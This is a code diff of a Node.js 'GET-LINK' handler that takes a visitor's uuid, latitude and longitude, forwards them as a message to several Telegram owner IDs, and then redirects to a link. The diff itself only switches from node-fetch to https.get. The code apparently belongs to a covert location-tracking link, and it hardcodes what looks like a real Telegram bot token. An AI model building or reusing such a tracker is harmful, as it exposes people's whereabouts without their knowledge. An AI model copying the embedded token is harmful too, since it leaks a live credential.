@@ -1,6 +1,6 @@
 const fs = require('fs');
 const path = require('path');
-const fetch = require('node-fetch');
+const https = require('https');
 
 module.exports = async (req, res) => {
   console.log("📩 [GET-LINK] Новый запрос получен");
@@ -12,7 +12,7 @@ module.exports = async (req, res) => {
 
   let body = '';
   req.on('data', chunk => body += chunk);
-  req.on('end', async () => {
+  req.on('end', () => {
     try {
       console.log("📦 [GET-LINK] Получено тело:", body);
       const { uuid, latitude, longitude } = JSON.parse(body);
@@ -52,31 +52,17 @@ module.exports = async (req, res) => {
       const botToken = '8018448279:AAFGUqua1bsG73Wr8PKuoJjQhXP0UdOOXfQ';
 
       for (const id of ownerIds) {
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(locationMessage)}`;
         console.log("📬 [GET-LINK] Отправка в Telegram ID:", id);
 
-        try {
-          const tgResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-              chat_id: id,
-              text: locationMessage
-            })
-          });
-
-          const result = await tgResponse.json();
-
-          if (result.ok) {
+        https.get(url, tgRes => {
+          tgRes.on('data', () => {});
+          tgRes.on('end', () => {
             console.log(`✅ [GET-LINK] Сообщение отправлено пользователю ${id}`);
-          } else {
-            console.log(`❌ [GET-LINK] Ошибка от Telegram для пользователя ${id}:`, result);
-          }
-
-        } catch (err) {
-          console.log(`❌ [GET-LINK] Ошибка при отправке Telegram для пользователя ${id}:`, err.message);
-        }
+          });
+        }).on('error', (err) => {
+          console.log("❌ [GET-LINK] Ошибка Telegram:", err.message);
+        });
       }
 
       console.log("➡️ [GET-LINK] Перенаправление на:", link);
